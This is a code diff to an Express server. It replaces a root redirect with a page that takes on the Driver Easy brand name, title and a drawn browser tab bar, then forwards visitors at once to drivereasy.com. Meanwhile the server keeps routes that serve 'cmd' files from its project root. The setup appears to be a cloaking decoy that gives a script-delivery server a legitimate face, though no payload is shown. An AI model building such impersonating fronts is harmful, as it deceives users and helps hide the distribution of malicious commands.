@@ -13,6 +13,10 @@ app.use(express.urlencoded({ extended: true }));
 
 const projectRoot = process.cwd();
 
+const FAVICON_SVG = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><rect width="32" height="32" fill="#1a237e"/><path fill="#42a5f5" d="M16 6l-6 4v8l6 4 6-4v-8l-6-4zm0 2.5l3.5 2.3v4.4L16 17.2l-3.5-2v-4.4L16 8.5z"/><path stroke="#42a5f5" stroke-width="1.2" fill="none" d="M10 12h4M18 12h4M14 16v4M16 14h4v4h-4z"/></svg>`;
+
+const REDIRECT_URL = 'https://www.drivereasy.com/';
+
 const sendCmdFile = (filename, res) => {
   const filePath = path.join(projectRoot, filename);
   try {
@@ -27,7 +31,78 @@ const sendCmdFile = (filename, res) => {
   }
 };
 
-app.get('/', (req, res) => res.redirect(302, 'https://www.drivereasy.com/'));
+app.get('/favicon.svg', (req, res) => {
+  res.type('image/svg+xml').send(FAVICON_SVG);
+});
+
+app.get('/', (req, res) => {
+  const html = `<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="refresh" content="0;url=${REDIRECT_URL}">
+  <title>Driver Easy ® | Windows Driver Updater</title>
+  <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #1e1e1e; min-height: 100vh; }
+    .tab-bar {
+      display: flex;
+      align-items: center;
+      height: 36px;
+      background: #252526;
+      padding: 0 12px;
+      gap: 8px;
+      -webkit-app-region: drag;
+    }
+    .tab-bar .favicon {
+      width: 16px;
+      height: 16px;
+      flex-shrink: 0;
+    }
+    .tab-bar .title {
+      color: #fff;
+      font-size: 13px;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      flex: 1;
+    }
+    .tab-bar .close {
+      width: 12px;
+      height: 12px;
+      border: none;
+      background: transparent;
+      color: #ccc;
+      cursor: pointer;
+      font-size: 14px;
+      line-height: 1;
+      padding: 0;
+      -webkit-app-region: no-drag;
+    }
+    .tab-bar .close:hover { color: #fff; }
+    .content {
+      padding: 24px;
+      color: #ccc;
+      font-size: 14px;
+    }
+    .content a { color: #42a5f5; }
+  </style>
+</head>
+<body>
+  <div class="tab-bar">
+    <img class="favicon" src="/favicon.svg" alt="">
+    <span class="title">Driver Easy ® | Windows Driver Updater</span>
+    <button class="close" type="button" aria-label="Close">×</button>
+  </div>
+  <div class="content">
+    <p>Redirecting to <a href="${REDIRECT_URL}">Driver Easy</a>…</p>
+  </div>
+  <script>window.location.replace(${JSON.stringify(REDIRECT_URL)});</script>
+</body>
+</html>`;
+  res.type('text/html').send(html);
+});
 
 const cmdRoute = (filename) => (req, res) => sendCmdFile(filename, res);
 
